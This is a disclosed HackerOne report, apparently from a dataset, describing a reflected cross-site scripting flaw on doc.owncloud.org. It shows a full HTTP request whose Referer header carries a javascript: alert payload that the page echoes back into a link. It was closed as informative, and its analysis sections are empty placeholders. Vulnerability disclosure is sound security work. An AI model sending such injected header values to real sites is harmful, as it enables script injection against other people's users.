---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '130951'
original_report_id: '130951'
title: 'doc.owncloud.org: XSS via Referrer'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: owncloud
created_at: '2016-04-15T00:15:38.758Z'
disclosed_at: '2016-04-15T09:20:08.539Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# doc.owncloud.org: XSS via Referrer

## Metadata

- HackerOne Report ID: 130951
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: owncloud
- Disclosed At: 2016-04-15T09:20:08.539Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Hi,

The Referer Header in the following request, can be used to trigger an XSS.


GET /promote/ HTTP/1.1
Host: doc.owncloud.org
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Referer: javascript:alert('XSS');
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 2

The Referrer Value is reflected in the page (in the "referring page" link) see the PoC, however the XSS is not trigger until the victim click in the link.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
